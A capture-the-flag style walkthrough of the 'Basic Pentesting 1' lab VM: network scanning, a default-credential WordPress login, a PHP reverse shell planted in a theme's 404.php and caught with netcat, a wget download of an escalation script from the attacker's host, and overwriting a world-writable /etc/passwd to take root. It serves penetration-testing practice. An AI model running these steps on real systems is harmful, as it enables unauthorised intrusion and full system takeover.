# Basic Pentesting 1

### Find own IP/Network

    ifconfig

        >eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.30.131  netmask 255.255.255.0  broadcast 192.168.30.255

### Scan Network

Here we see http port 80 is open on our target

    nmap 192.168.30.0/24
    
>Nmap scan report for 192.168.30.128
Host is up (0.00072s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:04:64:FF (VMware)

    
### Add host to hosts file for convenience

    echo 192.168.30.128 vtcsec >> /etc/hosts
    
    
### Enumerate HTTP

    nmap --script=http-enum vtcsec
  
  
  
>Nmap scan report for vtcsec (192.168.30.128)
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /secret/: Potentially interesting folder
MAC Address: 00:0C:29:04:64:FF (VMware)

### The wordpress site

Navigate to:
    
    vtcsec/secret
    
This is found to be a wordpress site. Try the default login page wp-login.php to see if it works

    vtcsec/secret/wp-login.php
    
 Login Page Found

Test Default Password

    Login: admin
    Pass: admin
    

### Upload Reverse shell script

Check themes, what is currently active?

    Appearance > Themes
    
Edit a 404.php page

    Appearance > editor > (select a non active theme. here I use twentysixteen) > 404 template(404.php)
    
Copy and paste Pentestmonkey PHP Reverse Shell script. (Don't forget to set the local port and ip! Here I use port 7777)
    
    (Modify this stuff)
    $ip = '192.168.30.131'; //CHANGE THIS
    $port = '7777'; //CHANGE THIS


### Set up listener

    nc -lvp 7777
    
### Open page and load the 404.php

    (open in browser) vtcsec/secret/wp-content/themes/twentysixteen/404.php
    
    or
    
    curl vtcsec/secret/wp-content/themes/twentysixteen/404.php
    
Reverse shell received
    
listening on [any] 7777 ...
connect to [192.168.30.131] from vtcsec [192.168.30.128] 57100
Linux vtcsec 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:37:43 up 50 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
    
    
### Privilege Escalation

Upload an escalation checker script. LinEnum.sh used here

        cd <folder with script>
        python -m SimpleHTTPServer 1234
        
On reverse shell, navigate to a world writable folder and download

        cd /tmp
        wget 192.168.30.131:1234/LinEnum.sh
        
>$ wget 192.168.30.131:1234/unix-privesc-check
--2018-12-11 06:22:18--  http://192.168.30.131:1234/unix-privesc-check
Connecting to 192.168.30.131:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 49721 (49K) [application/octet-stream]
Saving to: 'unix-privesc-check'

     0K .......... .......... .......... .......... ........  100% 15.2M=0.003s

2018-12-11 06:22:18 (15.2 MB/s) - 'unix-privesc-check' saved [49721/49721]



### Run Script

        chmod +x unix-*
        (because i'm lazy af)
        ./unix-* standard | grep WARNING
        
Something interesting is found

>$ ./unix-* standard | grep WARNING                               
passwd: Permission denied.
Search the output below for the word 'WARNING'.  If you don't see it then
[UPC004] WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
[UPC004] WARNING: /etc/passwd can be written to World write is set for /etc/passwd

### Changing passwords

Transfer file through apache folder since port 80 is already open

        cp /etc/passwd /var/www/html/
        
Go into an easily accessible folder on attacker machine(i used desktop) and download the passwd file

        cd ~/Desktop
        wget vtcsec/passwd

Edit the password

In any text editor of your choice, replace the 'x' inside the passwd file with the following for 'root' and 'marlinspike':

        $6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0
        (This basically means 'test')
        
 Close the previous python SimpleHTTPServer if it's still running. Run it again from the folder where the modifled passwd file is.
 
        cd ~/Desktop
        python -m SimpleHTTPServer 1234
        
 On the reverse shell, replace the /etc/passwd file with the modified one. use wget -O to output/overwrite
 
        wget 192.168.30.131:1234/passwd -O /etc/passwd
        
>ERROR: could not open HSTS store. HSTS will be disabled.
--2018-12-11 08:23:21--  http://192.168.30.131:1234/passwd
Connecting to 192.168.30.131:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2558 (2.5K) [application/octet-stream]
Saving to: '/etc/passwd'
0K ..                                                    100%  195M=0s
utime(/etc/passwd): Operation not permitted
2018-12-11 08:23:21 (195 MB/s) - '/etc/passwd' saved [2558/2558]


### Logging in

Try to log in with the reverse shell
    
        $ su root
        su: must be run from a terminal

Annoying.. Open bash then

        $ python -c 'import pty;pty.spawn("/bin/bash")'
        www-data@vtcsec:/$ 

Switch user again. Don't forget we also changed marlinspike's password to 'test', we can use that account as well

        www-data@vtcsec:/$ su root
        su root
        Password: test
        root@vtcsec:/var/www/html# whoami
        root

